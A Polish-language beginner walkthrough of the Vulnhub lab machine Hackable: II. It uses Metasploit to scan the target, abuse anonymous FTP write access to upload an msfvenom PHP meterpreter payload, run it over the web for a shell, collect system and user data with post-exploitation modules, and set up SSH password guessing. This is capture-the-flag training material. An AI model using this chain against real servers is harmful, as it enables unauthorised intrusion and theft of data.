---
title: "Hackable: II"
excerpt: " "
comments: true
categories:
  - Hacking
tags:
  - Hacking
  - Vulnhub
header:
  overlay_image: /assets/images/pasek-hack.png
---
# Wstęp
[Hackable: II](https://www.vulnhub.com/entry/hackable-ii,711) [autora](https://www.vulnhub.com/author/elias-sousa,804/) jest bardzo prostą maszyną do złamania, nawet prostszą niż wcześniej opisywany [Hackathonctf-1](https://kerszl.github.io/hacking/hackathonctf-1/). Dzisiaj oprzemy się głównie na Metasploicie, a z dodatkowych narzędzi postaramy się korzystać jak najmniej. Ten tutorial jest skierowany do bardzo początkujących. Jeżeli przejdziesz tę maszynę z pomocą tego wpisu, spróbuj jeszcze raz, tylko już samodzielnie.
{: .text-justify}
## Zaczynamy:
Tradycyjnie odpalamy Metasploita. Zakładam, że baza Metasploita na Postgresie jest już utworzona, żeby zapisywać nasze wyniki. Inaczej nie stworzymy obszaru roboczego:
{: .text-justify}
```bash
msf6 > workspace -a hackable2
[*] Added workspace: hackable2
[*] Workspace: hackable2
msf6 >
```
Skanujemy naszą maszynkę:
```bash
msf6 > db_nmap -A -p- 172.16.1.244
..........
..........
msf6 > services
Services
========

host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
172.16.1.244  21    tcp    ftp   open   ProFTPD
172.16.1.244  22    tcp    ssh   open   OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 Ubuntu Linux; protocol 2.0
172.16.1.244  80    tcp    http  open   Apache httpd 2.4.18 (Ubuntu)
```
Widać 3 otwarte porty. Sprawdźmy czy można wejść na ftp przez anonymous:
```bash
msf6 > use auxiliary/scanner/ftp/anonymous
msf6 auxiliary(scanner/ftp/anonymous) > set rhosts 172.16.1.244
rhosts => 172.16.1.244
msf6 auxiliary(scanner/ftp/anonymous) > run

[+] 172.16.1.244:21       - 172.16.1.244:21 - Anonymous READ/WRITE (220 ProFTPD Server (ProFTPD Default Installation) [172.16.1.244])
[*] 172.16.1.244:21       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Można wejść. Na ftpie jest plik CALL.html, można też wrzucać swoje pliki, więc mamy podatność.
{: .text-justify}
```
-rw-r--r--   1 0        0             109 Nov 26  2020 CALL.html
```
Ssh nie skanujemy. Na www jest strona z konfiguracją Apache.
![apache](/assets/images/hacking/2021/05/01.png)
Tak, jak wspomniałem wcześniej, wykorzystujemy na maksa Metasploita, więc użyjmy pluginu Wmap do przeskanowania stronki:
```bash
msf6 auxiliary(scanner/ftp/anonymous) > load wmap

.-.-.-..-.-.-..---..---.
| | | || | | || | || |-'
`-----'`-'-'-'`-^-'`-'
[WMAP 1.5.1] ===  et [  ] metasploit.com 2012
[*] Successfully loaded plugin: wmap
msf6 auxiliary(scanner/ftp/anonymous) > wmap_sites -a http://172.16.1.244
[*] Site created.
msf6 auxiliary(scanner/ftp/anonymous) >
msf6 auxiliary(scanner/ftp/anonymous) > wmap_run -e
[*] Using ALL wmap enabled modules.
[-] NO WMAP NODES DEFINED. Executing local modules
[*] Testing target:
[*]     Site: 172.16.1.244 (172.16.1.244)
[*]     Port: 80 SSL: false
..........
..........
```
Zobaczmy co nam Wmap znalazł:
{: .text-justify}
```bash
msf6 auxiliary(scanner/ftp/anonymous) > wmap_vulns -l
[*] + [172.16.1.244] (172.16.1.244): scraper /
[*]     scraper Scraper
[*]     GET Apache2 Ubuntu Default Page: It works
[*] + [172.16.1.244] (172.16.1.244): directory /files/
[*]     directory Directory found.
[*]     GET Res code: 404
[*] + [172.16.1.244] (172.16.1.244): directory /icons/
[*]     directory Directory found.
[*]     GET Res code: 403
[*] + [172.16.1.244] (172.16.1.244): file /index.html
[*]     file File found.
[*]     GET Res code: 404
[*] + [172.16.1.244] (172.16.1.244): file /files
[*]     file File found.
[*]     GET Res code: 301
```
Voilà – jest katalog files, a w nim plik CALL.html, tak jak na ftp-ie. Wchodząc na **http://172.16.1.244/files/CALL.html** nic ciekawego nie znajdziemy, chociaż w tytule strony jest onion. Nazwa nam nic nie mówi. Jednak wychodzi, że strona www jest powiązana z ftp-em. Przez ftp-a wrzucamy plik, a przez www go odpalamy. Oczywiście do tego użyjemy Metasploita (oprócz wrzutki przez ftp-a). Najlepsze ładunki są z konsolą meterpreter, więc ich szukajmy:
{: .text-justify}
```bash
root@kali:~# msfvenom -p php/meterpreter/bind_tcp LPORT=5555 > php_meterpreter_bind_tcp.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1338 bytes
```
Do katalogu **files** wrzucamy **php_meterpreter_bind_tcp.php**, ale zanim odświeżymy i uruchomimy na stronie, to załadujmy nasz ładunek i exploita w Msfconsole:

```bash
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload php/meterpreter/bind_tcp
payload => php/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set lport 5555
lport => 5555
msf6 exploit(multi/handler) > set rhost 172.16.1.244
rhost => 172.16.1.244
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (php/meterpreter/bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  5555             yes       The listen port
   RHOST  172.16.1.244     no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/handler) >
[*] Started bind TCP handler against 172.16.1.244:5555
[*] Sending stage (39282 bytes) to 172.16.1.244
[*] Meterpreter session 1 opened (0.0.0.0:0 -> 172.16.1.244:5555) at 2021-07-29 21:39:28 +0200
sessions

Active sessions
===============

  Id  Name  Type                   Information             Connection
  --  ----  ----                   -----------             ----------
  1         meterpreter php/linux  www-data (33) @ ubuntu  0.0.0.0:0 -> 172.16.1.244:5555 (172.16.1.244)
```
Najlepiej użyć tego samego ładunku do Metasploita i ten, co wrzucamy na atakowany serwer. (Zadanie dla czytelnika. Spróbuj sam stworzyć ładunek i się połączyć, ale tym razem przez payload/php/meterpreter_reverse_tcp). 
{: .text-justify}
{: .notice--success}
Mamy sesję i możemy eksplorować podatny serwer. Teraz użyjemy modułów powłamaniowych, żeby ściągnąć trochę informacji na nasz komputer.
{: .text-justify}
Użyjemy dwóch modułów:
```bash
msf6 exploit(multi/handler) > use post/linux/gather/enum_system
msf6 post(linux/gather/enum_system) > show options

Module options (post/linux/gather/enum_system):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf6 post(linux/gather/enum_system) > set session 1
session => 1
msf6 post(linux/gather/enum_system) > run

[!] SESSION may not be compatible with this module (missing Meterpreter features: core commands)
[+] Info:
[+]     Ubuntu 16.04.7 LTS
[+]     Linux ubuntu 4.4.0-194-generic #226-Ubuntu SMP Wed Oct 21 10:19:36 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
[+]     Module running as "www-data" user
[*] Linux version stored in /root/.msf4/loot/20210729214801_default_172.16.1.244_linux.enum.syste_823874.txt
[*] User accounts stored in /root/.msf4/loot/20210729214801_default_172.16.1.244_linux.enum.syste_792608.txt
[*] Installed Packages stored in /root/.msf4/loot/20210729214801_default_172.16.1.244_linux.enum.syste_940047.txt
[*] Running Services stored in /root/.msf4/loot/20210729214801_default_172.16.1.244_linux.enum.syste_790666.txt
[*] Cron jobs stored in /root/.msf4/loot/20210729214801_default_172.16.1.244_linux.enum.syste_485080.txt
[*] Disk info stored in /root/.msf4/loot/20210729214801_default_172.16.1.244_linux.enum.syste_296708.txt
[*] Logfiles stored in /root/.msf4/loot/20210729214801_default_172.16.1.244_linux.enum.syste_341841.txt
[*] Setuid/setgid files stored in /root/.msf4/loot/20210729214801_default_172.16.1.244_linux.enum.syste_709424.txt
[*] CPU Vulnerabilities stored in /root/.msf4/loot/20210729214802_default_172.16.1.244_linux.enum.syste_388295.txt
[*] Post module execution completed
msf6 post(linux/gather/enum_system) > loot
```
komenda loot pozwala nam wyświetlić, to co ściągnęliśmy
{: .text-justify}
w pliku **20210729214957_default_172.16.1.244_linux.enum.syste_656649.txt** mamy użytkowników z podatnej maszyny
{: .text-justify}
{: .notice--info}
moduł **post/linux/gather/enum_users_history** sciagnie nam plik Sudoers
{: .text-justify}
{: .notice--info}

moduł use auxiliary/scanner/ssh/ssh_login pozwala nam dosyć pobieżnie przeskanować użytkowników i przy okazji ustawić sesję, jeżeli kogoś znajdzie. Również może się przydać do ustawienia sesji w Metasploicie, jeżeli znamy tylko login i hasło.
Sprawdźmy czy użytkownicy mają jakieś słabe hasła na systemie. Niestety ten moduł jest dosyć wolny, ale może coś znajdziemy. W parametrach podajemy, żeby używał hasła jako loginu i podajemy plik gdzie zostali zapisani użytkownicy z obrazu hackable II. Verbose należy ustawić na yes, wtedy widać co się skanuje.
{: .text-justify}
{: .notice--info}


